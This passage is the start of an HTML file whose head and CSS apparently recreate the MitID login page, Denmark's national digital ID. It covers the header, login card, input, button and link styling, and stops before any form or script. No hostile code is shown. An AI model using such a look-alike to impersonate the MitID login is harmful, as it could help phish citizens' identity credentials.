<!doctype html>
<html lang="da">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Log p&aring; &ndash; MitID</title>
<link rel="icon" type="image/x-icon" href="assets/favicon.ico">
<style>
@import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&display=swap');

*, *::after, *::before { box-sizing: border-box; }
html, body { margin: 0; height: 100%; width: 100%; }
body {
  background-color: #fff;
  font-family: "IBM Plex Sans", "IBMPlexSans", system-ui, sans-serif;
  font-size: 16px;
  font-weight: normal;
  color: #1a1a1a;
  -webkit-font-smoothing: antialiased;
}
a { color: #0060E6; }
p { line-height: 24px; }

/* HEADER */
.header-container { display: flex; flex-direction: column; align-items: center; border: none; background-color: #F5F5F5; }
.header-content { display: flex; flex-direction: column; flex-grow: 1; max-width: 912px; min-height: 156px; width: 100%; justify-content: flex-end; align-items: stretch; }
.header-row { display: flex; flex-direction: row; flex-grow: 0; width: 100%; }
.header-links { display: flex; flex-direction: row; flex-grow: 0; justify-content: flex-start; padding-top: 24px; padding-bottom: 10px; min-height: 30px; align-items: center; }
.link-burger { display: flex; align-items: center; gap: 8px; background: none; border: none; cursor: pointer; color: #191919; font-size: 14px; font-family: inherit; padding: 4px 0; }
.link-spacer { display: flex; flex: 1; }
.link-language { display: flex; flex: 0; background-color: #fff; border: 1px solid #BFBFBF; border-radius: 4px; cursor: pointer; color: #0060E6; font-size: 12px; font-weight: bold; padding: 6px 16px; margin-left: 8px; font-family: inherit; }
.link-language:hover { color: #000; }
.link-language:focus { outline: 4px solid #747474; outline-offset: 1px; }
.header-logo { display: flex; flex-direction: column; flex-grow: 1; align-self: center; justify-content: center; align-items: start; }
.header-logo > img { height: 44px; width: auto; }
.header-nav { display: flex; flex-direction: row; flex-grow: 0; justify-content: flex-start; white-space: nowrap; overflow: hidden; }
.header-nav-link { display: flex; flex-direction: row; height: 48px; font-weight: normal; color: #000; text-decoration: none; }
.header-nav-link.selected { display: flex; flex-direction: row; font-weight: 500; }
.btn-lead-spacer { flex: 1; }
.btn-slice2 { display: flex; padding: 7px 32px; justify-content: center; align-items: center; font-size: 16px; font-weight: 500; border-top: 3px solid transparent; border-bottom: 3px solid transparent; }
.header-nav-link.selected > .btn-slice2 { background-color: #fff; border-top: solid 3px #0060E6; }
.header-nav-link:not(.selected):hover > .btn-slice2 { border-bottom: solid 3px #999; }

/* PAGE */
.page-container { display: flex; flex-direction: column; align-items: center; flex: 1; }
.page-content { display: flex; flex-direction: row; flex-grow: 1; flex-shrink: 0; max-width: 912px; width: 100%; }
.page-section { display: flex; flex: 1; flex-shrink: 0; flex-direction: column; }
.main-section { padding: 64px 42px 16px 0; }

/* LOGIN CARD */
.login-card { background: #fff; border: 1px solid #ccc; border-radius: 4px; padding: 32px 24px; max-width: 544px; width: 100%; position: relative; min-height: 480px; }
.login-card-header { display: flex; justify-content: space-between; align-items: center; margin: 0 0 16px; }
.login-card-header h1 { display: inline; margin: 0; font-size: 20px; font-weight: 600; color: #000; }
.login-card-header-right { display: flex; align-items: center; }
.login-card-divider { border: 0; border-top: 1px solid rgba(0,0,0,.1); margin: 16px 0 16px; }

/* FIELD */
.field-label { display: flex; align-items: center; margin-bottom: 8px; }
.field-label label { font-size: 14px; font-weight: 600; color: #1a1a1a; }
.info-icon { width: 18px; height: 18px; cursor: pointer; color: #747474; margin-left: 8px; }

/* INPUT */
.input-wrap { position: relative; margin-bottom: 14px; }
.input-wrap input { width: 100%; height: 40px; border: 1px solid rgb(116,116,116); border-radius: 4px; padding: 0 56px 0 10px; font-size: 16px; font-family: inherit; color: #1a1a1a; outline: none; background: #fff; }
.input-wrap input:focus { outline: 4px solid #747474; outline-offset: 1px; }
.input-wrap .hide-btn { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); font-size: 12px; color: #0060E6; cursor: pointer; background: none; border: none; padding: 2px 4px; font-family: inherit; font-weight: 600; }

/* BUTTON */
.btn-primary { display: flex; align-items: center; justify-content: space-between; width: 100%; min-height: 40px; padding: 8px 16px; border: 2px solid #0060E6; border-radius: 4px; background-color: #0060E6; color: #fff; font-family: "IBM Plex Sans", "IBMPlexSans", system-ui, sans-serif; font-size: 16px; font-weight: 500; cursor: pointer; line-height: 1em; letter-spacing: normal; margin-bottom: 12px; }
.btn-primary.active:hover { background-color: #004993; border-color: #003972; }
.btn-primary.active:active { background-color: #003972; border-color: #003972; }
.btn-primary:focus { outline: 4px solid #747474; outline-offset: 1px; }
.btn-primary.disabled { opacity: 0.3; cursor: not-allowed; }
.btn-primary.disabled:hover { background-color: #0059B3 !important; border-color: #004993 !important; }
.btn-primary .arrow-icon { display: flex; align-items: center; flex-shrink: 0; }
.btn-primary .arrow-icon svg { width: 24px; height: 24px; fill: #fff; }

/* FORGOT LINK */
.forgot-link { display: inline-flex; align-items: center; gap: 8px; color: #0059B3; font-size: 14px; cursor: pointer; text-decoration: none; }
.forgot-link:hover { text-decoration: underline; }
.forgot-link svg { width: 20px; height: 20px; flex-shrink: 0; }

/* CHECKBOX */
.checkbox-wrap { display: flex; align-items: center; gap: 10px; margin: 18px 0; }
.checkbox-wrap input[type=checkbox] { width: 18px; height: 18px; accent-color: #0060E6; cursor: pointer; }
.checkbox-wrap label { font-size: 14px; color: #1a1a1a; cursor: pointer; }

/* BOTTOM LINKS */
.bottom-links { display: flex; align-items: center; gap: 40px; }
.bottom-links span { font-size: 14px; font-weight: 600; color: #0059B3; cursor: pointer; }
.bottom-links span:hover { text-decoration: underline; }
